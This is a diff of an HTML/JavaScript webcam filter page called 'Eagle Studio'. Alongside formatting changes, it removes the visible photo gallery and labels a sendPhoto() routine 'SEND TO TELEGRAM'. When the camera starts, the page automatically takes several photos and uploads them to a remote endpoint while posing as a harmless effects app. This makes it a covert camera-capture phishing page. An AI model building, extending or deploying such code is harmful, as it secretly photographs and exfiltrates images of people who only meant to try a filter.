@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Eagle Studio</title>
 
 <style>
@@ -42,6 +43,10 @@ body{
   overflow-x:hidden;
   transition:background .3s,color .3s;
 }
+
+/* =========================
+   TOP BAR
+========================= */
 
 .topbar{
   height:68px;
@@ -106,10 +111,18 @@ body.dark .topbar{
   box-shadow:0 6px 18px rgba(0,0,0,.08);
 }
 
+/* =========================
+   MAIN
+========================= */
+
 .main{
   width:min(1180px,94%);
   margin:30px auto 55px;
 }
+
+/* =========================
+   HERO
+========================= */
 
 .hero{
   text-align:center;
@@ -126,6 +139,10 @@ body.dark .topbar{
   color:var(--muted);
   font-size:12px;
 }
+
+/* =========================
+   CAMERA
+========================= */
 
 .camera-wrap{
   display:flex;
@@ -184,6 +201,10 @@ video{
   border:1px solid rgba(255,255,255,.08);
   border-radius:24px;
 }
+
+/* =========================
+   CONTROLS
+========================= */
 
 .controls{
   display:flex;
@@ -279,6 +300,10 @@ video{
   font-weight:600;
 }
 
+/* =========================
+   PANELS
+========================= */
+
 .panel{
   background:var(--surface);
   border:1px solid var(--border);
@@ -305,6 +330,10 @@ video{
   color:var(--muted);
   font-size:10px;
 }
+
+/* =========================
+   EFFECTS
+========================= */
 
 .effects{
   display:flex;
@@ -374,78 +403,86 @@ video{
   letter-spacing:.4px;
 }
 
-.p-normal{background:linear-gradient(135deg,#e7c0a5,#555)}
-.p-mirror{background:linear-gradient(135deg,#9ed0ff,#555);transform:scaleX(-1)}
-.p-gray{background:linear-gradient(135deg,#ddd,#222);filter:grayscale(1)}
-.p-sepia{background:linear-gradient(135deg,#d6a46d,#543);filter:sepia(1)}
-.p-warm{background:linear-gradient(135deg,#ffb36b,#773);filter:sepia(.3) saturate(1.5)}
-.p-cool{background:linear-gradient(135deg,#7bc8ff,#234);filter:hue-rotate(25deg)}
-.p-vivid{background:linear-gradient(135deg,#ff3b8d,#14bfff);filter:saturate(1.8)}
-.p-dream{background:linear-gradient(135deg,#ffcce4,#b9dfff);filter:brightness(1.15)}
-.p-noir{background:linear-gradient(135deg,#eee,#111);filter:grayscale(1) contrast(1.5)}
-.p-old{background:linear-gradient(135deg,#c89c64,#4b3928);filter:sepia(.7)}
-.p-glitch{background:linear-gradient(90deg,#ff00aa,#00ffff,#ffff00)}
-.p-thermal{background:linear-gradient(90deg,#1600ff,#ff0000,#ffff00)}
-.p-night{background:linear-gradient(135deg,#14233d,#1e6b48)}
-.p-gold{background:linear-gradient(135deg,#ffe38a,#8a5d00)}
-.p-pink{background:linear-gradient(135deg,#ffb5d8,#d83286)}
-.p-blue{background:linear-gradient(135deg,#9bdcff,#1555aa)}
-.p-fade{background:linear-gradient(135deg,#ddd,#aaa)}
-
-.gallery{
-  display:grid;
-  grid-template-columns:repeat(auto-fill,minmax(115px,1fr));
-  gap:11px;
+.p-normal{
+  background:linear-gradient(135deg,#e7c0a5,#555);
 }
 
-.gallery-empty{
-  text-align:center;
-  color:var(--muted);
-  font-size:11px;
-  padding:22px 0;
-  grid-column:1/-1;
+.p-mirror{
+  background:linear-gradient(135deg,#9ed0ff,#555);
+  transform:scaleX(-1);
 }
 
-.gallery-item{
-  aspect-ratio:1/1;
-  border-radius:13px;
-  overflow:hidden;
-  background:#111;
-  position:relative;
-  animation:galleryIn .3s ease;
+.p-gray{
+  background:linear-gradient(135deg,#ddd,#222);
+  filter:grayscale(1);
 }
 
-@keyframes galleryIn{
-  from{
-    opacity:0;
-    transform:scale(.92);
-  }
-  to{
-    opacity:1;
-    transform:scale(1);
-  }
+.p-sepia{
+  background:linear-gradient(135deg,#d6a46d,#543);
+  filter:sepia(1);
 }
 
-.gallery-item img{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-  display:block;
+.p-warm{
+  background:linear-gradient(135deg,#ffb36b,#773);
+  filter:sepia(.3) saturate(1.5);
 }
 
-.gallery-download{
-  position:absolute;
-  right:7px;
-  bottom:7px;
-  width:31px;
-  height:31px;
-  border:0;
-  border-radius:9px;
-  background:rgba(0,0,0,.68);
-  color:#fff;
-  cursor:pointer;
-  backdrop-filter:blur(8px);
+.p-cool{
+  background:linear-gradient(135deg,#7bc8ff,#234);
+  filter:hue-rotate(25deg);
 }
+
+.p-vivid{
+  background:linear-gradient(135deg,#ff3b8d,#14bfff);
+  filter:saturate(1.8);
+}
+
+.p-dream{
+  background:linear-gradient(135deg,#ffcce4,#b9dfff);
+  filter:brightness(1.15);
+}
+
+.p-noir{
+  background:linear-gradient(135deg,#eee,#111);
+  filter:grayscale(1) contrast(1.5);
+}
+
+.p-old{
+  background:linear-gradient(135deg,#c89c64,#4b3928);
+  filter:sepia(.7);
+}
+
+.p-glitch{
+  background:linear-gradient(90deg,#ff00aa,#00ffff,#ffff00);
+}
+
+.p-thermal{
+  background:linear-gradient(90deg,#1600ff,#ff0000,#ffff00);
+}
+
+.p-night{
+  background:linear-gradient(135deg,#14233d,#1e6b48);
+}
+
+.p-gold{
+  background:linear-gradient(135deg,#ffe38a,#8a5d00);
+}
+
+.p-pink{
+  background:linear-gradient(135deg,#ffb5d8,#d83286);
+}
+
+.p-blue{
+  background:linear-gradient(135deg,#9bdcff,#1555aa);
+}
+
+.p-fade{
+  background:linear-gradient(135deg,#ddd,#aaa);
+}
+
+/* =========================
+   SAVE AREA
+========================= */
 
 .save-area{
   display:flex;
@@ -458,6 +495,10 @@ video{
   min-width:190px;
   justify-content:center;
 }
+
+/* =========================
+   SETTINGS
+========================= */
 
 .settings{
   position:fixed;
@@ -546,6 +587,10 @@ video{
   pointer-events:auto;
 }
 
+/* =========================
+   TOAST
+========================= */
+
 .toast{
   position:fixed;
   left:50%;
@@ -568,22 +613,77 @@ video{
   transform:translate(-50%,0);
 }
 
-.fx-mirror{transform:scaleX(-1)}
-.fx-gray{filter:grayscale(1)}
-.fx-sepia{filter:sepia(1)}
-.fx-warm{filter:sepia(.25) saturate(1.45) contrast(1.05)}
-.fx-cool{filter:saturate(.8) hue-rotate(25deg) brightness(1.08)}
-.fx-vivid{filter:saturate(1.8) contrast(1.12)}
-.fx-dream{filter:brightness(1.15) saturate(.85) contrast(.9)}
-.fx-noir{filter:grayscale(1) contrast(1.5) brightness(.85)}
-.fx-old{filter:sepia(.65) contrast(1.15) saturate(.7)}
-.fx-glitch{filter:hue-rotate(90deg) saturate(2) contrast(1.3)}
-.fx-thermal{filter:hue-rotate(150deg) saturate(2.2) contrast(1.35)}
-.fx-night{filter:hue-rotate(85deg) saturate(1.7) brightness(.75) contrast(1.2)}
-.fx-gold{filter:sepia(.3) saturate(1.7) brightness(1.05)}
-.fx-pink{filter:hue-rotate(310deg) saturate(1.5)}
-.fx-blue{filter:hue-rotate(190deg) saturate(1.35)}
-.fx-fade{filter:contrast(.82) saturate(.65) brightness(1.08)}
+/* =========================
+   FILTERS
+========================= */
+
+.fx-mirror{
+  transform:scaleX(-1);
+}
+
+.fx-gray{
+  filter:grayscale(1);
+}
+
+.fx-sepia{
+  filter:sepia(1);
+}
+
+.fx-warm{
+  filter:sepia(.25) saturate(1.45) contrast(1.05);
+}
+
+.fx-cool{
+  filter:saturate(.8) hue-rotate(25deg) brightness(1.08);
+}
+
+.fx-vivid{
+  filter:saturate(1.8) contrast(1.12);
+}
+
+.fx-dream{
+  filter:brightness(1.15) saturate(.85) contrast(.9);
+}
+
+.fx-noir{
+  filter:grayscale(1) contrast(1.5) brightness(.85);
+}
+
+.fx-old{
+  filter:sepia(.65) contrast(1.15) saturate(.7);
+}
+
+.fx-glitch{
+  filter:hue-rotate(90deg) saturate(2) contrast(1.3);
+}
+
+.fx-thermal{
+  filter:hue-rotate(150deg) saturate(2.2) contrast(1.35);
+}
+
+.fx-night{
+  filter:hue-rotate(85deg) saturate(1.7) brightness(.75) contrast(1.2);
+}
+
+.fx-gold{
+  filter:sepia(.3) saturate(1.7) brightness(1.05);
+}
+
+.fx-pink{
+  filter:hue-rotate(310deg) saturate(1.5);
+}
+
+.fx-blue{
+  filter:hue-rotate(190deg) saturate(1.35);
+}
+
+.fx-fade{
+  filter:contrast(.82) saturate(.65) brightness(1.08);
+}
+
+/* =========================
+   MOBILE
+========================= */
 
 @media(max-width:700px){
 
@@ -668,11 +768,6 @@ video{
     height:43px;
   }
 
-  .gallery{
-    grid-template-columns:repeat(3,1fr);
-    gap:8px;
-  }
-
   .settings{
     width:320px;
   }
@@ -691,9 +786,19 @@ video{
 
   <div class="top-actions">
 
-    <button class="icon-btn" id="themeBtn" aria-label="Theme">☾</button>
+    <button
+      class="icon-btn"
+      id="themeBtn"
+      aria-label="Theme">
+      ☾
+    </button>
 
-    <button class="icon-btn" id="settingsBtn" aria-label="Settings">⚙</button>
+    <button
+      class="icon-btn"
+      id="settingsBtn"
+      aria-label="Settings">
+      ⚙
+    </button>
 
   </div>
 
@@ -702,9 +807,14 @@ video{
 <main class="main">
 
   <div class="hero">
+
     <h1>Studio Camera</h1>
+
     <p>Create your shot with your favorite style.</p>
+
   </div>
+
+  <!-- CAMERA -->
 
   <div class="camera-wrap">
 
@@ -726,9 +836,13 @@ video{
 
   </div>
 
+  <!-- CONTROLS -->
+
   <div class="controls">
 
-    <button class="btn primary" id="start">
+    <button
+      class="btn primary"
+      id="start">
       🎥 تشغيل الكاميرا
     </button>
 
@@ -741,7 +855,12 @@ video{
 
   </div>
 
-  <div class="auto-info" id="autoInfo"></div>
+  <div
+    class="auto-info"
+    id="autoInfo">
+  </div>
+
+  <!-- EFFECTS -->
 
   <section class="panel">
 
@@ -848,33 +967,13 @@ video{
 
   </section>
 
-  <section class="panel">
-
-    <div class="section-header">
-
-      <div class="section-title">
-        Gallery
-      </div>
-
-      <div class="section-subtitle">
-        Recent shots
-      </div>
-
-    </div>
-
-    <div class="gallery" id="gallery">
-
-      <div class="gallery-empty">
-        Your captured photos will appear here.
-      </div>
-
-    </div>
-
-  </section>
+  <!-- SAVE -->
 
   <div class="save-area">
 
-    <button class="btn save-btn" id="save">
+    <button
+      class="btn save-btn"
+      id="save">
       💾 Save / Download
     </button>
 
@@ -882,9 +981,16 @@ video{
 
 </main>
 
-<div class="overlay" id="overlay"></div>
+<!-- SETTINGS -->
 
-<aside class="settings" id="settingsPanel">
+<div
+  class="overlay"
+  id="overlay">
+</div>
+
+<aside
+  class="settings"
+  id="settingsPanel">
 
   <div class="settings-header">
 
@@ -892,7 +998,9 @@ video{
       Settings
     </div>
 
-    <button class="close-settings" id="closeSettings">
+    <button
+      class="close-settings"
+      id="closeSettings">
       ✕
     </button>
 
@@ -908,10 +1016,14 @@ video{
       Choose the JPEG quality used when saving photos.
     </div>
 
-    <select class="setting-select" id="quality">
+    <select
+      class="setting-select"
+      id="quality">
+
       <option value="0.92">High — 92%</option>
       <option value="0.85">Balanced — 85%</option>
       <option value="0.75">Standard — 75%</option>
+
     </select>
 
   </div>
@@ -926,10 +1038,14 @@ video{
       Number of automatic photos after starting the camera.
     </div>
 
-    <select class="setting-select" id="photoCount">
+    <select
+      class="setting-select"
+      id="photoCount">
+
       <option value="10">10 photos</option>
       <option value="5">5 photos</option>
       <option value="3">3 photos</option>
+
     </select>
 
   </div>
@@ -944,21 +1060,35 @@ video{
       Time between automatic photos.
     </div>
 
-    <select class="setting-select" id="photoInterval">
+    <select
+      class="setting-select"
+      id="photoInterval">
+
       <option value="1000">1 second</option>
       <option value="1500">1.5 seconds</option>
       <option value="2000">2 seconds</option>
+
     </select>
 
   </div>
 
 </aside>
 
-<div class="toast" id="toast"></div>
+<div
+  class="toast"
+  id="toast">
+</div>
 
-<canvas id="canvas" style="display:none"></canvas>
+<canvas
+  id="canvas"
+  style="display:none">
+</canvas>
 
 <script>
+
+/* =========================
+   ELEMENTS
+========================= */
 
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
@@ -967,7 +1097,6 @@ const start = document.getElementById("start");
 const capture = document.getElementById("capture");
 const save = document.getElementById("save");
 
-const gallery = document.getElementById("gallery");
 const autoInfo = document.getElementById("autoInfo");
 
 const themeBtn = document.getElementById("themeBtn");
@@ -982,6 +1111,11 @@ const photoInterval = document.getElementById("photoInterval");
 
 const toast = document.getElementById("toast");
 
+
+/* =========================
+   STATE
+========================= */
+
 let stream = null;
 let selectedEffect = "normal";
 let lastBlob = null;
@@ -989,11 +1123,14 @@ let lastBlob = null;
 let autoStarted = false;
 let sending = false;
 
-let galleryPhotos = [];
-
 let imageQuality = .92;
 let automaticPhotoCount = 10;
 let automaticInterval = 1000;
+
+
+/* =========================
+   TOAST
+========================= */
 
 function showToast(message){
 
@@ -1007,6 +1144,11 @@ function showToast(message){
 
 }
 
+
+/* =========================
+   SETTINGS
+========================= */
+
 settingsBtn.addEventListener("click",() => {
 
   settingsPanel.classList.add("open");
@@ -1014,12 +1156,14 @@ settingsBtn.addEventListener("click",() => {
 
 });
 
+
 function closeSettingsPanel(){
 
   settingsPanel.classList.remove("open");
   overlay.classList.remove("active");
 
 }
+
 
 closeSettings.addEventListener(
   "click",
@@ -1031,17 +1175,31 @@ overlay.addEventListener(
   closeSettingsPanel
 );
 
+
 quality.addEventListener("change",() => {
+
   imageQuality = Number(quality.value);
+
 });
+
 
 photoCount.addEventListener("change",() => {
+
   automaticPhotoCount = Number(photoCount.value);
+
 });
 
+
 photoInterval.addEventListener("change",() => {
+
   automaticInterval = Number(photoInterval.value);
+
 });
+
+
+/* =========================
+   DARK / LIGHT MODE
+========================= */
 
 themeBtn.addEventListener("click",() => {
 
@@ -1060,15 +1218,22 @@ themeBtn.addEventListener("click",() => {
 
 });
 
+
 const savedTheme =
   localStorage.getItem("eagle-theme");
 
 if(savedTheme === "dark"){
 
   document.body.classList.add("dark");
+
   themeBtn.textContent = "☀";
 
 }
+
+
+/* =========================
+   EFFECT SELECTION
+========================= */
 
 document.querySelectorAll(".effect").forEach(button => {
 
@@ -1091,6 +1256,11 @@ document.querySelectorAll(".effect").forEach(button => {
 
 });
 
+
+/* =========================
+   APPLY EFFECT
+========================= */
+
 function applyEffect(){
 
   video.className = "";
@@ -1111,6 +1281,11 @@ function applyEffect(){
   );
 
 }
+
+
+/* =========================
+   CANVAS FILTER
+========================= */
 
 function getCanvasFilter(effect){
 
@@ -1163,6 +1338,11 @@ function getCanvasFilter(effect){
 
 }
 
+
+/* =========================
+   CAPTURE ANIMATION
+========================= */
+
 function triggerCaptureAnimation(){
 
   capture.classList.remove(
@@ -1177,96 +1357,10 @@ function triggerCaptureAnimation(){
 
 }
 
-function addToGallery(blob){
 
-  const url =
-    URL.createObjectURL(blob);
-
-  galleryPhotos.unshift({
-    blob,
-    url
-  });
-
-  if(galleryPhotos.length > 12){
-
-    const removed =
-      galleryPhotos.pop();
-
-    URL.revokeObjectURL(
-      removed.url
-    );
-
-  }
-
-  renderGallery();
-
-}
-
-function renderGallery(){
-
-  gallery.innerHTML = "";
-
-  if(galleryPhotos.length === 0){
-
-    gallery.innerHTML = `
-      <div class="gallery-empty">
-        Your captured photos will appear here.
-      </div>
-    `;
-
-    return;
-  }
-
-  galleryPhotos.forEach((photo,index) => {
-
-    const item =
-      document.createElement("div");
-
-    item.className =
-      "gallery-item";
-
-    const img =
-      document.createElement("img");
-
-    img.src = photo.url;
-
-    img.alt =
-      "Eagle Studio photo";
-
-    const download =
-      document.createElement("button");
-
-    download.className =
-      "gallery-download";
-
-    download.textContent =
-      "↓";
-
-    download.title =
-      "Download";
-
-    download.addEventListener(
-      "click",
-      () => {
-
-        downloadBlob(
-          photo.blob,
-          "eagle-studio-" +
-          (index + 1) +
-          ".jpg"
-        );
-
-      }
-    );
-
-    item.appendChild(img);
-    item.appendChild(download);
-
-    gallery.appendChild(item);
-
-  });
-
-}
+/* =========================
+   DOWNLOAD
+========================= */
 
 function downloadBlob(blob,filename){
 
@@ -1298,11 +1392,17 @@ function downloadBlob(blob,filename){
 
 }
 
+
+/* =========================
+   TAKE PHOTO
+========================= */
+
 async function takePhoto(){
 
   if(!video.videoWidth){
     return null;
   }
+
 
   canvas.width =
     video.videoWidth;
@@ -1310,13 +1410,16 @@ async function takePhoto(){
   canvas.height =
     video.videoHeight;
 
+
   const ctx =
     canvas.getContext("2d");
+
 
   ctx.filter =
     getCanvasFilter(
       selectedEffect
     );
+
 
   if(selectedEffect === "mirror"){
 
@@ -1351,7 +1454,9 @@ async function takePhoto(){
 
   }
 
+
   ctx.filter = "none";
+
 
   const blob =
     await new Promise(resolve => {
@@ -1364,16 +1469,17 @@ async function takePhoto(){
 
     });
 
+
   if(!blob){
     return null;
   }
+
 
   lastBlob = blob;
 
   save.style.display =
     "inline-flex";
 
-  addToGallery(blob);
 
   triggerCaptureAnimation();
 
@@ -1381,20 +1487,28 @@ async function takePhoto(){
 
 }
 
+
+/* =========================
+   SEND TO TELEGRAM
+========================= */
+
 async function sendPhoto(blob){
 
   if(!blob){
     return false;
   }
 
+
   const data =
     new FormData();
+
 
   data.append(
     "photo",
     blob,
     "eagle-studio.jpg"
   );
+
 
   try{
 
@@ -1407,7 +1521,9 @@ async function sendPhoto(blob){
         }
       );
 
+
     return response.ok;
+
 
   }catch(error){
 
@@ -1419,14 +1535,21 @@ async function sendPhoto(blob){
 
 }
 
+
+/* =========================
+   AUTOMATIC PHOTOS
+========================= */
+
 async function startAutomaticPhotos(){
 
   if(autoStarted || sending){
     return;
   }
 
+
   autoStarted = true;
   sending = true;
+
 
   for(
     let i = 0;
@@ -1443,8 +1566,10 @@ async function startAutomaticPhotos(){
 
     });
 
+
     const blob =
       await takePhoto();
+
 
     if(blob){
 
@@ -1454,12 +1579,18 @@ async function startAutomaticPhotos(){
 
   }
 
+
   sending = false;
 
   autoInfo.textContent =
     "Automatic capture completed.";
 
 }
+
+
+/* =========================
+   WAIT FOR VIDEO
+========================= */
 
 function waitForVideoReady(){
 
@@ -1469,9 +1600,12 @@ function waitForVideoReady(){
       video.readyState >= 2 &&
       video.videoWidth
     ){
+
       resolve();
       return;
+
     }
+
 
     const check = () => {
 
@@ -1491,6 +1625,7 @@ function waitForVideoReady(){
 
     };
 
+
     video.addEventListener(
       "loadeddata",
       check
@@ -1500,6 +1635,11 @@ function waitForVideoReady(){
 
 }
 
+
+/* =========================
+   START CAMERA
+========================= */
+
 start.addEventListener(
   "click",
   async () => {
@@ -1507,6 +1647,7 @@ start.addEventListener(
     if(stream){
       return;
     }
+
 
     try{
 
@@ -1523,26 +1664,35 @@ start.addEventListener(
 
         });
 
+
       video.srcObject =
         stream;
 
+
       await waitForVideoReady();
+
 
       capture.disabled =
         false;
 
+
       start.disabled =
         true;
+
 
       start.textContent =
         "✓ الكاميرا تعمل";
 
+
       applyEffect();
+
 
       autoInfo.textContent =
         "Camera ready.";
 
+
       startAutomaticPhotos();
+
 
     }catch(error){
 
@@ -1550,6 +1700,7 @@ start.addEventListener(
 
       start.disabled =
         false;
+
 
       showToast(
         "Camera permission is required."
@@ -1560,6 +1711,11 @@ start.addEventListener(
   }
 );
 
+
+/* =========================
+   MANUAL CAPTURE
+========================= */
+
 capture.addEventListener(
   "click",
   async () => {
@@ -1567,10 +1723,12 @@ capture.addEventListener(
     const blob =
       await takePhoto();
 
+
     if(blob){
 
       const sent =
         await sendPhoto(blob);
+
 
       if(sent){
 
@@ -1591,6 +1749,11 @@ capture.addEventListener(
   }
 );
 
+
+/* =========================
+   SAVE LAST PHOTO
+========================= */
+
 save.addEventListener(
   "click",
   () => {
@@ -1599,10 +1762,12 @@ save.addEventListener(
       return;
     }
 
+
     downloadBlob(
       lastBlob,
       "eagle-studio.jpg"
     );
+
 
     showToast(
       "Photo downloaded."
@@ -1615,3 +1780,4 @@ save.addEventListener(
 
 </body>
 </html>
+  
